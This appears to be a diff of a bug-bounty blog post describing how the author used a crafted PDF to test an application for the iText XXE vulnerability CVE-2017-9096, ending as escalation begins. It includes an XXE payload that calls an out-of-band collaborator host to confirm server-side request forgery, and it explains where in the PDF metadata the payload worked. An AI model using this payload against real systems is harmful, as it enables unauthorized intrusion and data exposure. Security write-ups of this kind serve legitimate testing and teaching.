@@ -49,10 +49,11 @@ By looking for iText vulns the first google entry pointed me to a High rated vul
 
 Crafted PDF... cool, this involves some kind of tweak to a PDF file. Some dorks here and there and ran out to a [Github repo](https://github.com/jakabakos/CVE-2017-9096-iText-XXE) with working steps to exploit this CVE.
 
-Followed every step, embeded an XXE code: `<!DOCTYPE foo [ <!ENTITY xxe2 SYSTEM "http://collab" > ]>` to initally test for an SSRF on the suggested lines, uploaded it to the app and waited for a ping back to my collaborator... Nada... It has to be vulnerable right? Embeding the payload on different sections of the PDF file did nothing different. Changing the controlled host for some other just in case they had a blacklist on [well known OOB domains](https://x.com/saur1n/status/1888591256957210864) but still nothing.
+Followed every step, embeded an XXE code: ```<!DOCTYPE foo [ <!ENTITY xxe2 SYSTEM "http://collab" > ]>``` to initally test for an SSRF on the suggested lines, uploaded it to the app and waited for a ping back to my collaborator... Nada... It has to be vulnerable right? Embeding the payload on different sections of the PDF file did nothing different. Changing the controlled host for some other just in case they had a blacklist on [well known OOB domains](https://x.com/saur1n/status/1888591256957210864) but still nothing.
 
 By looking the sample PDF file used for the exploit with nano (I use nano btw) I had to find some other place to insert the code, searching for the string `<?xml` gave me some matches but on line 741 I saw this:
 
 <img src="/nano.png" alt="pdf metadata" width="800" height="300" />
 
-Alright, let's place it on 742 then... Upload it
+Alright, let's place it on line 742 then... Uploaded it... wait for it... wait for it... BOOM! DNS and HTTP interactions, so yeah its a vulnerable iText version to XXE. Now, it was time to escalate it.
+
